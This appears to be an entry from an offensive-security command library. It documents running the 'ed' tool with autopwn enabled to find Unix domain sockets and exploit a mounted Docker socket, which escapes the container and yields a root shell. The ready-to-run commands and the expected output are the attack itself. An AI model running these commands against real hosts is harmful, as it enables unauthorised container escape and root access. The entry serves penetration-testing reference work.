---
type: command
executor: bash
data: ./ed_linux_amd64 -path=/var/run/ -autopwn=true
output: null
created_at: '2023-04-06T03:56:16.917227+00:00'
updated_at: '2023-04-10T20:33:49.704451+00:00'
platforms:
  - Linux
tags:
  - docker
  - escape
  - privilege-escalation
verified: true
validated: true
---

# hunt-sockets-with-ed-tool

## Command

```bash
./ed_linux_amd64 -path=/var/run/ -autopwn=true
```

## Description

Executes the ed tool to scan for Unix domain sockets in the specified path and automatically exploit Docker sockets for container escape.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -path=/var/run/ | Directory to hunt sockets | Yes |
| -autopwn=true | Enable automatic exploitation | Yes |

## Examples

### Basic Usage

```bash
./ed_linux_amd64 -path=/var/run/ -autopwn=true
```

### Custom Path

```bash
./ed_linux_amd64 -path=/tmp/ -autopwn=true
```

## Expected Output

[+] Hunt dem Socks
[+] Hunting Down UNIX Domain Sockets from: /var/run/
[*] Valid Socket: /var/run/docker.sock
[+] Attempting to autopwn
... (escape messages and root shell prompt)

## Related

- [[procedures/Escape-Container-Using-Mounted-Docker-Socket]]
- [[tools/ed-container-escape]]
